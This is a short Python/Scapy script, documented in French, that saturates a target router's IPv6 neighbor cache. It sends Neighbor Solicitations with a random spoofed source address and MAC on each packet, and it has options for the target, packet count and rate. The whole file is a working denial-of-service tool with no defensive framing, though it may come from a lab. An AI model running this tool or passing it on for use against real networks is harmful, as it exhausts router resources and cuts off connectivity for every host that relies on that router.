#!/usr/bin/env python3
"""
nd_cache_router.py — saturation du cache de voisins d'un NOEUD cible (routeur).
Envoie des Neighbor Solicitation avec une adresse SOURCE ALEATOIRE a chaque
paquet (+ option Source Link-Layer Address), destinees au noeud cible. Le noeud
qui recoit une NS pour sa propre adresse cree une entree de cache pour la source
(afin de repondre par une NA) -> chaque source aleatoire = une entree -> le
cache se remplit.

Exemple :
  python3 /nd_cache_router.py --iface eth1 --target-ip 2001:db8:10:1::1 \
          --target-mac aa:bb:cc:dd:ee:ff --count 3000
"""
import argparse, random, time
from scapy.all import Ether, IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, sendp


def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def rand_lladdr():
    return "fe80::%x:%x:%x:%x" % tuple(random.randint(0, 0xffff) for _ in range(4))


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--target-ip", required=True, help="adresse du noeud a saturer (ex. routeur)")
    p.add_argument("--target-mac", required=True, help="MAC du noeud cible")
    p.add_argument("--count", type=int, default=3000)
    p.add_argument("--rate", type=int, default=500)
    args = p.parse_args()

    delay = 1.0 / args.rate if args.rate > 0 else 0
    sent = 0
    t0 = time.time()
    for _ in range(args.count):
        smac = rand_mac()
        pkt = (Ether(src=smac, dst=args.target_mac) /
               IPv6(src=rand_lladdr(), dst=args.target_ip) /
               ICMPv6ND_NS(tgt=args.target_ip) /
               ICMPv6NDOptSrcLLAddr(lladdr=smac))
        sendp(pkt, iface=args.iface, verbose=False)
        sent += 1
        if delay:
            time.sleep(delay)
    print(f"{sent} NS (sources aleatoires) envoyes vers {args.target_ip} en {time.time()-t0:.1f}s")


if __name__ == "__main__":
    main()